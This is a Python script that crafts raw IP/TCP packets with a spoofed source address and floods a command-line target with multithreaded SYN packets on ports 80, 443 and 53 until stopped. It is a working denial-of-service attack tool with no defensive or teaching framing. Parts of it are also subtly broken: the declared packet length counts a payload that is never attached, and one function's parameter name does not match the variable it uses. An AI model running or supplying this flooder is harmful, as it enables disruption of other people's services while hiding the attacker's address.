import sys
import threading

import socket
import struct


def checksum(msg):

    total = 0 
    
    # process in 16bit (2byte) chunks
    for i in range(0, len(msg), 2):
        word = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
        total += word
    
    # handle overflow 
    # add carry bits back into sum
    total = (total >> 16) + (total & 0xFFFF) 
    
    # one more carry addition 
    # in case theres still an overflow
    total = (total >> 16) + (total & 0xFFFF)

    # ones complement, mask to 16 bits
    checksum_result = ~total & 0xFFFF
    
    return checksum_result


def test_packet(sock, dst_ip, dst_port, packet):

    print(f"Sending a single SYN packet to {dst_ip}:{dst_port}")
    print(f"Packet (hex): {packet.hex()}")  # raw packet data
    sock.sendto(packet, (dst_ip, dst_port))
    print("Packet sent!") 
    sock.close()

    return


def flood(sock, dst_ip, dst_ports, packets):

    print(f"Flooding {dst_ip} with TCP SYN packets on ports {dst_ports}...")
    print("Press [CTRL] + C to stop")

    while True:
        try:
            for dst_port, packet in zip(dst_ports, packets):
                sock.sendto(packet, (dst_ip, dst_port))
        except KeyboardInterrupt:
            print("\nStopping TCP SYN flood...")
            break

    sock.close()

    return


def flood_threaded(num_threads, sock, dist_ip, dst_ports, packets):

    threads = []

    for _ in range(num_threads):
        thread = threading.Thread(target=flood, args=(sock, dst_ip, dst_ports, packets))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    return


def main(src_ip, src_port, dst_ip):

    # raw socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        print("Created raw socket...")
    except (socket.error):
        print(f"[ERROR] Something messed up buddy! Could not create socket!")
        print("Try running the script with escalated privileges")
        sys.exit()
        
    # prevent kernel from initializing headers
    # for custom headers
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    spoofed_src_ip = "192.168.10.111"

    # 80 HTTP
    # 443 HTTPS
    # 53 DNS
    dst_ports = [80, 443, 53]

    payload = b"A" * 1024

    # build ip header
    ip_header = struct.pack (
            "!BBHHHBBH4s4s",        # format string to specify header fields
            0x45,                   # version (4) + header length (5)
            0,                      # type of service (0 = default, no priority)   
            40 + len(payload),                     # total length, header + payload 
            60069,                  # unique packet id 
            0,                      # flag (0) + fragment offset (0) 
            255,                    # ttl, 255 hops 
            socket.IPPROTO_TCP,     # tcp protocol 
            0,                      # checksum (set to 0, recomputed later) 
            socket.inet_aton(spoofed_src_ip), 
            socket.inet_aton(dst_ip)
    )
    # IP RFC https://www.ietf.org/rfc/rfc791.txt

    # remake ip header with correct checksum
    ip_checksum = checksum(ip_header)
    ip_header = struct.pack ("!BBHHHBBH4s4s", 0x45, 0, 40 + len(payload), 60069, 0, 255, socket.IPPROTO_TCP, ip_checksum, socket.inet_aton(spoofed_src_ip), socket.inet_aton(dst_ip))

    

    packets = []

    # build tcp headers
    # create a packet for each dst port
    for dst_port in dst_ports:

        # temporary header with checksum 0
        tcp_header = struct.pack (
                "!HHLLBBHHH",       # format string to specify TCP header fields 
                src_port, 
                dst_port,
                0,                  # SYN no. (init 0 or random)
                0,                  # ACK no. (0 for initial SYN)
                0x50,               # data offset 
                0x02,               # tcp flags (0x02 for SYN)
                8192,               # window (buffer) size
                0,                  # checksum (recomputed)
                0                   # urgent pointer
        )
        # TCP RFC 9293 (updated after RFC 793) https://www.ietf.org/rfc/rfc9293.txt

        packet = struct.pack('!4s4sBBH', socket.inet_aton(spoofed_src_ip), socket.inet_aton(dst_ip), 0, socket.IPPROTO_TCP, len(tcp_header) + len(payload))
        packet = packet + tcp_header

        # remake tcp header with correct checksum
        tcp_checksum = checksum(packet)
        tcp_header = struct.pack("!HHLLBBHHH", src_port, dst_port, 0, 0, 0x50, 0x02, 8192, tcp_checksum, 0)
        packet = ip_header + tcp_header 

        # add packet to packets list
        packets.append(packet)

    # test_packet(sock, dst_ip, dst_ports[0], packets[0])
    flood_threaded(8, sock, dst_ip, dst_ports, packets)
    # flood(sock, dst_ip, dst_ports, packets)


if __name__ == "__main__":
    
    if len(sys.argv) != 4:
        print("Usage: sudo python main.py [src ip] [src port] [dst ip]")
        exit();

    src_ip = sys.argv[1]
    src_port = int(sys.argv[2])
    dst_ip = sys.argv[3]

    main(src_ip, src_port, dst_ip)


